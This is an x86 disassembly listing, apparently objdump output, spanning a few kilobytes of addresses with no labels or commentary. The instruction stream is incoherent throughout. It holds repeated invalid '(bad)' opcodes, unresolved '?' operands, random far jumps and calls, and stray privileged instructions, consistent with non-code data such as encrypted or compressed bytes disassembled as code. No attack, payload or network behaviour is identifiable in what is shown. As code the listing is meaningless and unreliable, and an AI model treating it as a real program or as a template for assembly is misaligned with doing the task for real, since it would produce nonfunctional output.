  5123cf:	mov    BYTE PTR [edx+eax*1+0x42],al
  5123d3:	iret   
  5123d4:	scas   al,BYTE PTR es:[edi]
  5123d5:	jne    0x5123df
  5123d7:	fist   DWORD PTR [ebx+0x25]
  5123da:	add    BYTE PTR [ebp+0x48],ch
  5123dd:	push   ecx
  5123de:	ss xor al,0x8e
  5123e1:	pop    ecx
  5123e2:	xchg   esi,eax
  5123e3:	mov    DWORD PTR [ebx-0x19],ebx
  5123e6:	jg     0x512436
  5123e8:	mov    ecx,0x692f5ce
  5123ed:	jns    0x512461
  5123ef:	and    edx,DWORD PTR [edi+edi*8]
  5123f2:	inc    ebx
  5123f3:	ja     0x51246e
  5123f5:	fs xor eax,0xfc37cef5
  5123fb:	inc    ecx
  5123fc:	scas   al,BYTE PTR es:[edi]
  5123fd:	jge    0x512397
  5123ff:	push   0xffffffde
  512401:	cmp    al,0xb
  512403:	push   ds
  512404:	test   BYTE PTR [ebx+0x29],0x40
  512408:	leave  
  512409:	rcr    DWORD PTR [esi+edx*1],0x71
  51240d:	pop    ds
  51240e:	push   ebp
  51240f:	scas   eax,DWORD PTR es:[edi]
  512410:	mov    bh,0x35
  512412:	frstor [ebp+0x15e9fdfd]
  512418:	dec    eax
  512419:	xchg   DWORD PTR [ebx],ecx
  51241b:	xchg   ecx,eax
  51241c:	pop    ecx
  51241d:	mov    fs,WORD PTR [esi+edx*2-0x54daafd4]
  512424:	inc    edi
  512425:	and    eax,0x6af43413
  51242a:	xchg   edx,eax
  51242b:	sbb    edi,DWORD PTR [ebx-0x48d3035a]
  512431:	mov    dl,BYTE PTR fs:[ebp-0xa]
  512435:	test   al,0x51
  512437:	adc    DWORD PTR [esi],edx
  512439:	xor    eax,0x3eaa0c8f
  51243e:	mov    ch,0x54
  512440:	add    dh,BYTE PTR [eax+0x79]
  512443:	call   0x4430:0xee241314
  51244a:	mov    ah,0xaa
  51244c:	xor    BYTE PTR [edi],bh
  51244e:	rol    bl,0x84
  512451:	xchg   esi,eax
  512452:	sub    edx,edi
  512454:	push   ds
  512455:	(bad)  
  512456:	mov    ah,0x9b
  512458:	jp     0x51242c
  51245a:	xchg   edi,eax
  51245b:	sub    al,0x44
  51245d:	ds pop eax
  51245f:	lock dec edx
  512461:	arpl   WORD PTR [ebp-0x68],cx
  512464:	fld    DWORD PTR [ecx+0x1534d6a0]
  51246a:	xchg   ebp,eax
  51246b:	ficomp WORD PTR [edi-0x60]
  51246e:	mov    ch,0xa1
  512470:	pop    eax
  512471:	in     eax,dx
  512472:	sbb    al,0x5
  512474:	arpl   WORD PTR [edx-0x61ec3dca],sp
  51247a:	out    0xa3,eax
  51247c:	(bad)  
  51247d:	out    dx,al
  51247e:	out    0x2d,al
  512480:	icebp  
  512481:	dec    ebp
  512482:	cmp    al,0xd9
  512484:	cmp    BYTE PTR [eax],ah
  512486:	push   es
  512487:	test   al,0x37
  512489:	xor    ah,BYTE PTR [esp+eax*1]
  51248c:	shl    ah,1
  51248e:	cmp    DWORD PTR [edx+0x43323475],esp
  512494:	call   0xccc4419f
  512499:	dec    ebx
  51249a:	cmp    bl,ah
  51249c:	clc    
  51249d:	jp     0x512439
  51249f:	sti    
  5124a0:	mov    DWORD PTR [edi-0x7a],eax
  5124a3:	cmp    al,0xe5
  5124a5:	pop    ds
  5124a6:	call   ecx
  5124a8:	sbb    cl,dh
  5124aa:	in     eax,dx
  5124ab:	mov    ebx,0x8c25dcf6
  5124b0:	mov    esp,0x872447d1
  5124b5:	les    ebp,FWORD PTR [ebp-0x5bdfa23e]
  5124bb:	cmovnp edx,esi
  5124be:	jmp    0x66a5:0x936c0d1a
  5124c5:	(bad)  
  5124c6:	jae    0x51245f
  5124c8:	xchg   ecx,eax
  5124c9:	mov    edi,0x817923b5
  5124cf:	inc    edx
  5124d0:	loope  0x51249d
  5124d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5124d3:	push   edi
  5124d4:	rcl    DWORD PTR [eax+0x3b],1
  5124d7:	loopne 0x5124ab
  5124d9:	ins    BYTE PTR es:[edi],dx
  5124da:	scas   eax,DWORD PTR es:[edi]
  5124db:	cld    
  5124dc:	or     al,0x35
  5124de:	stos   DWORD PTR es:[edi],eax
  5124df:	push   ebp
  5124e0:	mov    al,al
  5124e2:	ret    0xe1fd
  5124e5:	cli    
  5124e6:	jg     0x512482
  5124e8:	jge    0x512492
  5124ea:	dec    ecx
  5124eb:	jbe    0x51249c
  5124ed:	out    0x0,al
  5124ef:	arpl   WORD PTR [eax+0x51],ax
  5124f2:	rcl    DWORD PTR es:[eax-0x66],cl
  5124f6:	mov    ebx,0x67656f1c
  5124fb:	mov    cl,0x3c
  5124fd:	repz fsqrt 
  512500:	inc    ecx
  512501:	inc    edi
  512502:	stos   BYTE PTR es:[edi],al
  512503:	jnp    0x5124da
  512505:	dec    esi
  512506:	call   0x55717834
  51250b:	xchg   BYTE PTR [edx-0x286a3c8f],dl
  512511:	push   esi
  512512:	lods   eax,DWORD PTR ds:[esi]
  512513:	imul   esp,DWORD PTR [ecx-0x56],0x54818f95
  51251a:	mov    ch,0x44
  51251c:	ret    
  51251d:	mov    esi,0xe5b67732
  512522:	test   eax,esp
  512524:	mul    bl
  512526:	add    esi,DWORD PTR [eax-0x75]
  512529:	ja     0x51259c
  51252b:	push   edx
  51252c:	je     0x5124dc
  51252e:	sbb    edi,DWORD PTR [ebp+0x1a]
  512531:	std    
  512532:	scas   al,BYTE PTR es:[edi]
  512533:	push   edx
  512534:	push   ds
  512535:	jns    0x51259f
  512537:	jle    0x512560
  512539:	cmp    al,0xc9
  51253b:	cli    
  51253c:	dec    ebx
  51253d:	xchg   esi,eax
  51253e:	mov    BYTE PTR [ebx],bl
  512540:	xchg   esp,eax
  512541:	leave  
  512542:	cwde   
  512543:	das    
  512544:	mov    dl,0xa
  512546:	cld    
  512547:	ret    0x6d53
  51254a:	sub    ecx,edi
  51254c:	mov    WORD PTR [esi],fs
  51254e:	les    edx,FWORD PTR [edi]
  512550:	and    ebp,DWORD PTR [edx+0x7826cd74]
  512556:	lods   eax,DWORD PTR ds:[esi]
  512557:	(bad)  
  512559:	aam    0x2d
  51255b:	push   ebp
  51255c:	jmp    0x51251d
  51255e:	imul   esp,DWORD PTR [ebx+0x7a],0x45dde92a
  512565:	repnz cmp esi,eax
  512568:	call   0xd78cdc5d
  51256d:	bound  ecx,QWORD PTR [edx-0x3a2fc1b0]
  512573:	push   edx
  512574:	add    DWORD PTR [esi+ebx*8+0x10e1f2da],ebp
  51257b:	jmp    0x51253e
  51257d:	adc    BYTE PTR [esi-0xc],bl
  512580:	lock sub DWORD PTR [ecx+0x24783bcb],ebx
  512587:	(bad)  
  512588:	cli    
  512589:	or     ebp,ecx
  51258b:	cmp    BYTE PTR [edi-0x5],cl
  51258e:	fwait
  51258f:	pop    edi
  512590:	jae    0x51255d
  512592:	and    eax,0x7950baae
  512597:	or     BYTE PTR [esi-0x33971ee2],0x31
  51259e:	test   DWORD PTR [ebx],0x45458e7a
  5125a4:	test   BYTE PTR [ebx-0x4d],al
  5125a7:	or     bl,BYTE PTR [edx-0x22]
  5125aa:	jmp    0x51257f
  5125ac:	ss push edx
  5125ae:	repnz aam 0x54
  5125b1:	pop    edi
  5125b2:	xor    BYTE PTR [ebp+0x1b42ef12],bl
  5125b8:	scas   al,BYTE PTR es:[edi]
  5125b9:	ins    BYTE PTR es:[edi],dx
  5125ba:	xchg   edx,eax
  5125bb:	mov    es,WORD PTR ds:0xb89d8179
  5125c1:	icebp  
  5125c2:	mov    cl,BYTE PTR [edi+0x3728c36a]
  5125c8:	xor    eax,0x92ef4eea
  5125cd:	call   0x7794:0x59a8d074
  5125d4:	enter  0xf21a,0x75
  5125d8:	sbb    DWORD PTR [bx+si+0x18cd],eax
  5125dd:	mov    esp,0xa3ecbf95
  5125e2:	ret    0xa92f
  5125e5:	cld    
  5125e6:	pop    ebx
  5125e7:	xchg   edx,eax
  5125e8:	pop    ds
  5125e9:	and    al,0x4
  5125eb:	repz gs pop eax
  5125ee:	and    al,dl
  5125f0:	out    0xfd,al
  5125f2:	lea    edx,[ebx]
  5125f4:	mov    cl,0xd8
  5125f6:	cld    
  5125f7:	mov    ah,0x23
  5125f9:	scas   al,BYTE PTR es:[edi]
  5125fa:	and    BYTE PTR [ebx+0x8],dh
  5125fd:	call   0xcbb413a1
  512602:	pop    ecx
  512603:	sub    BYTE PTR cs:[ecx-0x51b8c57e],cl
  51260a:	inc    edx
  51260b:	cdq    
  51260c:	loope  0x5125fe
  51260e:	dec    esp
  51260f:	push   esi
  512610:	mov    WORD PTR [ecx+0x5c],?
  512613:	adc    DWORD PTR [ebp+0x7390275],0x1d9f6fcf
  51261d:	mov    dl,bl
  51261f:	test   BYTE PTR [ebx],dh
  512621:	or     al,0x36
  512623:	push   ss
  512624:	popa   
  512625:	mov    esi,0xf7843f08
  51262a:	mov    WORD PTR [ecx],fs
  51262c:	or     edi,edx
  51262e:	sub    cl,BYTE PTR [ecx-0x70]
  512631:	dec    ecx
  512632:	mov    al,0x6
  512634:	sbb    eax,0x1f79b0fc
  512639:	repz call 0x51778b74
  51263f:	push   0xffffff93
  512641:	out    0x9d,eax
  512643:	mov    DWORD PTR [ebx+edx*1+0x61],ebx
  512647:	lock mov bl,0xa7
  51264a:	and    DWORD PTR [esi-0x256a1470],edi
  512650:	and    DWORD PTR [edi],ebx
  512652:	imul   edi,DWORD PTR [esi+0x7f],0xe8878d49
  512659:	xchg   BYTE PTR [edx+eiz*1],bh
  51265c:	xchg   ecx,eax
  51265d:	push   edx
  51265e:	std    
  51265f:	std    
  512660:	adc    eax,0x4dc2240d
  512665:	stc    
  512666:	jg     0x512619
  512668:	jae    0x5126c5
  51266a:	push   ebp
  51266b:	repz cmp DWORD PTR [ecx+0x5d],esi
  51266f:	or     ch,dl
  512671:	jbe    0x51267e
  512673:	and    DWORD PTR [esi],0x2ba243c0
  512679:	(bad)  
  51267a:	fstp   st(6)
  51267c:	dec    edi
  51267d:	adc    DWORD PTR [edi+0x63564a36],ebx
  512683:	xchg   edi,eax
  512684:	xchg   ebp,eax
  512685:	sbb    eax,0x26dcb4e9
  51268a:	popf   
  51268b:	or     al,0x98
  51268d:	pushf  
  51268e:	adc    dh,BYTE PTR [ecx+0x3aa428cb]
  512694:	aaa    
  512695:	mov    eax,0x6d572ba8
  51269a:	adc    BYTE PTR [edi-0xa6be2db],bl
  5126a0:	cmp    al,0x6f
  5126a2:	call   0xfc19:0x2efdcd18
  5126a9:	test   eax,0x6d0d856e
  5126ae:	ffreep st(7)
  5126b0:	pop    ebx
  5126b1:	stc    
  5126b2:	jb     0x5126cf
  5126b4:	je     0x512727
  5126b6:	mov    ebp,0x4363afc
  5126bb:	imul   ebp,DWORD PTR [eax+ebp*4+0x31],0x58
  5126c0:	enter  0xf7b9,0xd3
  5126c4:	jle    0x5126cc
  5126c6:	sbb    ebx,edx
  5126c8:	dec    edx
  5126c9:	xchg   edi,eax
  5126ca:	xor    BYTE PTR [edx-0x19793bee],0x1d
  5126d1:	mov    al,0xd8
  5126d3:	imul   BYTE PTR [edi+0x6dada46]
  5126d9:	mov    DWORD PTR [esi+0x2e],eax
  5126dc:	hlt    
  5126dd:	jp     0x51268f
  5126df:	dec    esi
  5126e0:	adc    cl,BYTE PTR [edi]
  5126e2:	and    al,0xc1
  5126e4:	push   esp
  5126e5:	and    bh,dl
  5126e7:	mov    al,0x17
  5126e9:	mov    cl,BYTE PTR [ebx-0x63]
  5126ec:	jmp    0x9743:0x6968c4c3
  5126f3:	push   eax
  5126f4:	out    dx,al
  5126f5:	dec    ebp
  5126f6:	rol    al,1
  5126f8:	sub    eax,0x56c835f6
  5126fd:	les    ebp,FWORD PTR [eax-0x1b]
  512700:	mov    dh,0x5b
  512702:	pop    es
  512703:	push   ss
  512704:	xchg   edx,eax
  512706:	div    DWORD PTR [edx+0x37d576d7]
  51270c:	aaa    
  51270d:	inc    edx
  51270e:	lds    ebp,FWORD PTR [ebx+0x10]
  512711:	cs cwde 
  512713:	mov    ecx,0xf364bbb6
  512718:	mov    ecx,0x2eba54bb
  51271d:	jecxz  0x5126e0
  51271f:	mov    ds:0x9c69cbfa,eax
  512724:	gs jmp ebp
  512727:	imul   ebp,DWORD PTR [ecx+eiz*4+0x43ad5f01],0x54b99421
  512732:	fmul   QWORD PTR [eax+0x6f]
  512735:	push   edi
  512736:	mov    ch,0xcf
  512738:	jmp    0x7f1d:0x27612532
  51273f:	loopne 0x512770
  512741:	jl     0x5127a0
  512743:	ins    DWORD PTR es:[edi],dx
  512744:	dec    ebx
  512745:	add    BYTE PTR ds:0x277ba1c,ah
  51274b:	aaa    
  51274c:	jne    0x51275d
  51274e:	ret    0xbb04
  512751:	cmp    DWORD PTR [edx],0xffffffb7
  512754:	adc    BYTE PTR [ecx+0x20],ah
  512757:	ss popa 
  512759:	or     dl,BYTE PTR [ecx+0x31d02bca]
  51275f:	dec    ebp
  512760:	push   cs
  512761:	pop    ebp
  512762:	pop    ds
  512763:	mov    esi,0xbeda110c
  512768:	ja     0x5127bf
  51276a:	aad    0x1
  51276c:	and    BYTE PTR [esi+esi*4+0x68],0x22
  512771:	lods   eax,DWORD PTR ds:[esi]
  512772:	or     al,0xbe
  512774:	push   eax
  512775:	(bad)  
  512777:	xchg   edx,eax
  512778:	add    dh,dl
  51277a:	xlat   BYTE PTR ds:[ebx]
  51277b:	mov    ah,0x97
  51277d:	ret    
  51277e:	jmp    0x40b61799
  512783:	pop    esi
  512784:	push   ebx
  512785:	mov    ds:0xb142932f,al
  51278a:	test   al,0x10
  51278c:	(bad)  [edx+0x4f88a5f0]
  512792:	inc    edi
  512793:	pushf  
  512794:	ja     0x51271b
  512796:	sub    eax,0x1033081f
  51279b:	sub    ah,0x92
  51279e:	loopne 0x5127af
  5127a0:	outs   dx,DWORD PTR ds:[esi]
  5127a1:	or     edx,0xbf1aaa84
  5127a7:	cwde   
  5127a8:	add    al,0x66
  5127aa:	dec    ecx
  5127ab:	xchg   ebp,eax
  5127ac:	hlt    
  5127ad:	cmp    ebp,DWORD PTR [ecx]
  5127af:	xor    ebx,edi
  5127b1:	test   al,0xe
  5127b3:	pop    edx
  5127b4:	stos   DWORD PTR es:[edi],eax
  5127b5:	inc    edi
  5127b6:	fst    QWORD PTR [ecx-0x9]
  5127b9:	inc    esp
  5127ba:	mov    cl,0x7c
  5127bc:	xchg   edi,eax
  5127bd:	inc    eax
  5127be:	push   esp
  5127bf:	ja     0x5127bf
  5127c1:	lahf   
  5127c2:	retf   0x9ee5
  5127c5:	or     ah,BYTE PTR [eax+0x40]
  5127c8:	cdq    
  5127c9:	call   0x4a54aef0
  5127ce:	mov    dl,0x80
  5127d0:	jmp    0x9390aa99
  5127d5:	stc    
  5127d6:	push   ebp
  5127d7:	fsub   QWORD PTR [edx-0x5e3d595a]
  5127dd:	or     BYTE PTR [ebp-0x72],bl
  5127e0:	push   cs
  5127e1:	mov    ecx,0xad83fd62
  5127e6:	cmc    
  5127e7:	mov    esp,0x7fc88b6b
  5127ec:	fnstcw WORD PTR [ecx+0x7e]
  5127ef:	add    edi,DWORD PTR [esp+ecx*1+0x2b740077]
  5127f6:	push   0x4
  5127f8:	and    edx,DWORD PTR [edx-0x6db85fe9]
  5127fe:	not    edi
  512800:	hlt    
  512801:	mov    ecx,0x5ce5c451
  512806:	inc    esi
  512807:	cmc    
  512808:	add    dh,BYTE PTR [edi+0x67]
  51280b:	inc    ebp
  51280c:	cmp    esi,DWORD PTR [ebx-0x1714f2fd]
  512812:	xor    BYTE PTR [ebp-0x1a],bl
  512815:	andnps xmm7,XMMWORD PTR [ebp+eiz*8+0x5c]
  51281a:	scas   al,BYTE PTR es:[edi]
  51281b:	emms   
  51281d:	sub    eax,0x879ad086
  512822:	mov    esp,0x3dc5844e
  512827:	mov    DWORD PTR [ecx],ecx
  512829:	or     bh,0x8a
  51282c:	fs stos DWORD PTR es:[edi],eax
  51282e:	repnz ins DWORD PTR es:[edi],dx
  512830:	cmp    DWORD PTR [ebp+0x7e30b982],ecx
  512836:	pop    ds
  512837:	mov    eax,0xe8267339
  51283c:	cmp    dh,bh
  51283e:	mov    eax,0xc14ade16
  512843:	out    dx,al
  512844:	leave  
  512845:	mov    ebp,esi
  512847:	dec    esp
  512848:	aaa    
  512849:	call   0x6779661a
  51284e:	imul   ecx,edx,0x74
  512851:	adc    al,0x47
  512853:	cmp    esi,DWORD PTR [esi]
  512855:	pop    ss
  512856:	in     al,dx
  512857:	adc    edi,ecx
  512859:	add    eax,0x5ddc99b
  51285e:	or     eax,0x8fa9901b
  512863:	add    eax,0xb2083684
  512868:	push   edx
  512869:	sbb    DWORD PTR [ebx-0x28f65a96],esi
  51286f:	rol    DWORD PTR [ebx-0x6c96b4c6],cl
  512875:	push   edi
  512876:	imul   esp,DWORD PTR [edx-0x43e80603],0x8
  51287d:	nop
  51287e:	sbb    BYTE PTR [ecx],ch
  512880:	push   0xcac66bb4
  512885:	pop    ebp
  512886:	(bad)  
  512888:	or     BYTE PTR [ebx],dl
  51288a:	push   edx
  51288b:	mov    edx,0x2b7f6223
  512890:	retf   
  512891:	adc    dh,dh
  512893:	push   0x3b22211c
  512898:	repnz mov ch,0x17
  51289b:	js     0x51290d
  51289d:	outs   dx,BYTE PTR ds:[esi]
  51289e:	sbb    bl,0x1
  5128a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5128a2:	stos   DWORD PTR es:[di],eax
  5128a4:	scas   al,BYTE PTR es:[edi]
  5128a5:	loop   0x512870
  5128a7:	popf   
  5128a8:	aad    0x37
  5128aa:	jno    0x5128f3
  5128ac:	ss jno 0x5128d5
  5128af:	fwait
  5128b0:	neg    DWORD PTR [eax-0x3a2c4675]
  5128b6:	jmp    0x8c6d4909
  5128bb:	(bad)  
  5128bc:	in     al,0x0
  5128be:	adc    DWORD PTR [ebx+ecx*2],esi
  5128c1:	inc    ebp
  5128c2:	sbb    eax,0x3aef5d12
  5128c7:	popf   
  5128c8:	inc    ebx
  5128c9:	test   eax,0x36ee07f
  5128ce:	lahf   
  5128cf:	jle    0x5128c3
  5128d1:	cmc    
  5128d2:	mov    ch,0xc0
  5128d4:	mov    WORD PTR [ebx+0x47],?
  5128d7:	lahf   
  5128d8:	rcr    al,0xaa
  5128db:	and    ch,BYTE PTR [edi+0x2]
  5128de:	fcmovnu st,st(6)
  5128e0:	loope  0x51293d
  5128e2:	test   al,0xfa
  5128e4:	repnz xchg ebp,eax
  5128e6:	sub    al,0x2c
  5128e8:	ins    DWORD PTR es:[edi],dx
  5128e9:	std    
  5128ea:	fst    QWORD PTR [eax+0x30]
  5128ed:	jmp    0x8f4bfa35
  5128f2:	jns    0x51288c
  5128f4:	cmp    al,0x1f
  5128f6:	mov    WORD PTR [edi],ss
  5128f8:	jns    0x5128be
  5128fa:	adc    ah,BYTE PTR [edx-0x610626cf]
  512900:	fidiv  WORD PTR [edx+0x23]
  512903:	jg     0x512893
  512905:	mov    al,0xa0
  512907:	js     0x5128cc
  512909:	sti    
  51290a:	mov    esp,0x62a0dfb5
  51290f:	daa    
  512910:	dec    esi
  512911:	(bad)  
  512912:	out    dx,eax
  512913:	or     BYTE PTR [ebp+0x63],dh
  512916:	push   esp
  512917:	test   DWORD PTR [edx-0x1d],esi
  51291a:	dec    ebp
  51291b:	sub    eax,0xd15f51fd
  512920:	dec    edi
  512921:	or     esp,DWORD PTR [ecx-0x5d]
  512924:	dec    edx
  512925:	mov    WORD PTR [edx],fs
  512927:	stos   DWORD PTR es:[edi],eax
  512928:	outs   dx,DWORD PTR ds:[esi]
  512929:	scas   al,BYTE PTR es:[edi]
  51292a:	push   ebp
  51292b:	inc    ecx
  51292c:	cmp    bl,ch
  51292e:	icebp  
  51292f:	pop    ebx
  512930:	test   BYTE PTR [ecx],dl
  512932:	xchg   ebx,eax
  512933:	into   
  512934:	cmc    
  512935:	mov    ebx,0x673bf4f6
  51293a:	imul   esp,DWORD PTR [edx+0x79],0x575d407c
  512941:	cmc    
  512942:	fdiv   st,st(1)
  512944:	mov    cl,0xc
  512946:	in     eax,dx
  512947:	jecxz  0x5129b4
  512949:	xchg   edx,eax
  51294a:	repz retf 0x73be
  51294e:	inc    esp
  51294f:	inc    edx
  512950:	jmp    0x5129ad
  512952:	jp     0x5128ea
  512954:	and    DWORD PTR [edi+0x2021d4f5],ebx
  51295a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51295b:	cmp    BYTE PTR [esi],bl
  51295d:	leave  
  51295e:	mov    fs,WORD PTR [eax+0x326e8f4]
  512964:	int3   
  512965:	or     DWORD PTR [edx+0x60],esp
  512968:	(bad)  
  512969:	popf   
  51296a:	out    dx,al
  51296b:	shl    BYTE PTR [edi-0x25c72b71],cl
  512971:	cmp    edi,DWORD PTR [edi-0x4e0088e9]
  512977:	dec    esp
  512978:	shr    edi,0x7
  51297b:	jae    0x5129ec
  51297d:	test   eax,0x9aec29f6
  512982:	dec    eax
  512983:	pop    es
  512984:	mov    cl,0x2d
  512986:	lds    eax,FWORD PTR [edi]
  512988:	shl    DWORD PTR [edx+0x2],cl
  51298b:	cmp    al,0x6e
  51298d:	hlt    
  51298e:	push   ds
  51298f:	aaa    
  512990:	jp     0x512969
  512992:	ds mov ecx,0x1fe69dc3
  512998:	shl    DWORD PTR ds:0xef1a8c7e,0x5f
  51299f:	retf   0xd95b
  5129a2:	and    BYTE PTR [eax+0x615339ac],ch
  5129a8:	mov    cl,0x67
  5129aa:	ins    DWORD PTR es:[edi],dx
  5129ab:	jmp    0x8234a78
  5129b0:	scas   al,BYTE PTR es:[edi]
  5129b1:	mov    ecx,0xc3fe1659
  5129b6:	lea    esp,[esi+0x6748c9ae]
  5129bc:	mov    ebx,0xf62e63bc
  5129c1:	nop
  5129c2:	test   al,0x9c
  5129c4:	hlt    
  5129c5:	push   esi
  5129c6:	and    BYTE PTR [esi+0x5ded24d6],dh
  5129cc:	rcr    BYTE PTR [edx],0xb0
  5129cf:	sahf   
  5129d0:	mov    ebx,0xceb9ae8f
  5129d5:	(bad)  
  5129d6:	dec    edx
  5129d7:	mov    cs,WORD PTR [edx-0xd]
  5129da:	mov    dl,0x2f
  5129dc:	lahf   
  5129dd:	(bad)  
  5129de:	das    
  5129df:	mov    edi,0xce21ea2f
  5129e4:	xchg   esp,eax
  5129e5:	jnp    0x512a1f
  5129e7:	mov    esp,0x66bc15d7
  5129ec:	hlt    
  5129ed:	pop    es
  5129ee:	jg     0x512a10
  5129f0:	in     al,dx
  5129f1:	xor    ebx,ebx
  5129f3:	loopne 0x512a6b
  5129f5:	fstp   QWORD PTR [edi+0x64]
  5129f8:	add    BYTE PTR [edi],ah
  5129fa:	jmp    0xf623a75a
  5129ff:	std    
  512a00:	fcom   DWORD PTR [edi]
  512a02:	jae    0x512a2a
  512a04:	push   eax
  512a05:	lock push ecx
  512a07:	xlat   BYTE PTR ds:[ebx]
  512a08:	mov    al,ds:0x97b2a1b8
  512a0d:	dec    edx
  512a0e:	fld    QWORD PTR [ecx]
  512a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  512a11:	push   edi
  512a12:	aam    0x2c
  512a14:	xchg   edx,eax
  512a15:	mov    ?,WORD PTR ds:0x1dc6af4e
  512a1b:	ret    0x59b6
  512a1e:	add    edi,DWORD PTR [ebx-0x5ee6b443]
  512a24:	retf   0xfbf8
  512a27:	mov    eax,DWORD PTR [edx+0x2f30549c]
  512a2d:	push   0xf7542d95
  512a32:	sub    dl,BYTE PTR [eax+0x387c0b07]
  512a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  512a39:	test   bl,dh
  512a3b:	and    edx,0x534b85c4
  512a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  512a42:	sti    
  512a43:	and    eax,0xdcd3f39c
  512a48:	xlat   BYTE PTR ds:[ebx]
  512a49:	xchg   edi,eax
  512a4a:	xor    BYTE PTR [eax+0x2b81fd9f],0x64
  512a51:	cli    
  512a52:	std    
  512a53:	cmp    eax,0x5daed153
  512a58:	fsubp  st(1),st
  512a5a:	aad    0xeb
  512a5c:	jecxz  0x512a34
  512a5e:	aas    
  512a5f:	inc    esi
  512a60:	clc    
  512a61:	sbb    DWORD PTR [edi+edx*2-0x5c20dbbb],0xffffff8b
  512a69:	loop   0x512ac8
  512a6b:	je     0x512aa5
  512a6d:	push   ecx
  512a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  512a6f:	pop    esi
  512a70:	sub    ebp,DWORD PTR [edi]
  512a72:	fldcw  WORD PTR [edx-0x10]
  512a75:	jmp    0x512a40
  512a77:	ins    DWORD PTR es:[edi],dx
  512a78:	and    BYTE PTR [ebp+0x7bc4f015],ah
  512a7e:	push   esp
  512a7f:	inc    eax
  512a80:	popf   
  512a81:	mov    esp,0x669a42f2
  512a86:	ret    0x93d3
  512a89:	push   cs
  512a8a:	inc    ebp
  512a8b:	mov    eax,0xe3d52308
  512a90:	rol    BYTE PTR ds:0xbf03de04,0x8c
  512a97:	xchg   esp,eax
  512a98:	cdq    
  512a99:	rcl    BYTE PTR [ebx],1
  512a9b:	jle    0x512b0d
  512a9d:	(bad)  
  512aa1:	jns    0x512a2e
  512aa3:	push   esp
  512aa4:	push   eax
  512aa5:	fwait
  512aa6:	mov    DWORD PTR [eax-0x2ecda372],eax
  512aac:	adc    ch,ch
  512aae:	xor    ah,BYTE PTR [eax]
  512ab0:	hlt    
  512ab1:	ret    
  512ab2:	inc    ebx
  512ab3:	enter  0x6a07,0x8c
  512ab7:	leave  
  512ab8:	push   ebp
  512ab9:	inc    eax
  512aba:	js     0x512a87
  512abc:	add    ecx,DWORD PTR [ecx+0x34]
  512abf:	aam    0xdf
  512ac1:	mov    bl,0xe3
  512ac3:	popf   
  512ac4:	push   ss
  512ac5:	popf   
  512ac6:	dec    esi
  512ac7:	pop    edi
  512ac8:	outs   dx,BYTE PTR ds:[esi]
  512ac9:	fsub   DWORD PTR [eax-0x4f01b9d1]
  512acf:	adc    bh,bl
  512ad1:	dec    edi
  512ad2:	mov    BYTE PTR [edi-0x61fae826],0xb8
  512ad9:	or     dh,BYTE PTR [ecx+0x1577ff20]
  512adf:	jge    0x512b56
  512ae1:	ins    BYTE PTR es:[edi],dx
  512ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  512ae3:	sti    
  512ae4:	data16 and bl,BYTE PTR [edx-0x6e]
  512ae8:	mov    ecx,gs
  512aea:	mov    ds:0x9bfec3db,al
  512aef:	es mov al,0x61
  512af2:	jp     0x512abb
  512af4:	dec    esi
  512af5:	dec    edi
  512af6:	jb     0x512b2a
  512af8:	das    
  512af9:	out    0xc7,al
  512afb:	(bad)
  512afe:	hlt    
  512aff:	adc    ch,BYTE PTR [ebx+ebp*8]
  512b02:	xor    DWORD PTR [esi+0x73],esi
  512b05:	stos   DWORD PTR es:[edi],eax
  512b06:	pop    ebp
  512b07:	mov    dl,0x9e
  512b09:	push   ebp
  512b0a:	hlt    
  512b0b:	popf   
  512b0c:	cs repz out dx,al
  512b0f:	push   0xbad1ceb7
  512b14:	in     eax,dx
  512b15:	and    al,0xe3
  512b17:	hlt    
  512b18:	cld    
  512b19:	sbb    BYTE PTR [esp+edi*1],ah
  512b1c:	or     al,BYTE PTR [edi+0x4b7f6ab1]
  512b22:	fnstsw WORD PTR [edi+0x75c930d9]
  512b28:	sub    DWORD PTR [esi],ebx
  512b2a:	pop    es
  512b2b:	add    dl,0x9c
  512b2e:	scas   al,BYTE PTR es:[edi]
  512b2f:	mov    bh,0xd0
  512b31:	dec    ecx
  512b32:	add    al,0xc6
  512b34:	ja     0x512b15
  512b36:	in     eax,0xe6
  512b38:	test   ecx,edi
  512b3a:	imul   ebp,DWORD PTR [ecx+ebp*2-0xe7f8f4b],0x50
  512b42:	push   ecx
  512b43:	ret    0xba6
  512b46:	in     eax,dx
  512b47:	jp     0x512b7f
  512b49:	rcr    BYTE PTR [ebp+0x7e],1
  512b4c:	xchg   BYTE PTR [esi-0x4e3f8c92],ah
  512b52:	mov    ds:0xc820ea91,al
  512b57:	sub    al,al
  512b59:	data16 fwait
  512b5b:	pop    eax
  512b5c:	stos   DWORD PTR es:[edi],eax
  512b5d:	mov    ds:0xfbcbef65,eax
  512b62:	or     ebp,DWORD PTR [esi]
  512b64:	jnp    0x512bc2
  512b66:	push   ss
  512b67:	push   ds
  512b68:	icebp  
  512b69:	fist   WORD PTR [eax-0x1c]
  512b6c:	int3   
  512b6d:	push   ds
  512b6e:	xchg   BYTE PTR [esi-0x60],bh
  512b71:	jge    0x512bcb
  512b73:	test   eax,0x666308ae
  512b78:	push   0xffffffbf
  512b7a:	into   
  512b7b:	jecxz  0x512b48
  512b7d:	outs   dx,DWORD PTR ds:[esi]
  512b7e:	push   edi
  512b7f:	cmp    BYTE PTR [ebx-0x26650b64],bl
  512b85:	adc    al,0x1d
  512b87:	add    dh,BYTE PTR [ebx]
  512b89:	ss or  eax,0x61f5be95
  512b8f:	jg     0x512b58
  512b91:	xchg   bh,dh
  512b93:	and    bl,BYTE PTR [ecx]
  512b95:	retf   
  512b96:	pop    esi
  512b97:	fs pop ebp
  512b99:	imul   ebx,ebp,0x1d0009b3
  512b9f:	arpl   WORD PTR [ecx],di
  512ba1:	enter  0x23ce,0x71
  512ba5:	lahf   
  512ba6:	push   0x72d2d7cf
  512bab:	enter  0x19ed,0xad
  512baf:	test   al,0x89
  512bb1:	leave  
  512bb2:	dec    esp
  512bb3:	sahf   
  512bb4:	addr16 cmp ch,bl
  512bb7:	jmp    0x1c8c69d8
  512bbc:	adc    al,0xd1
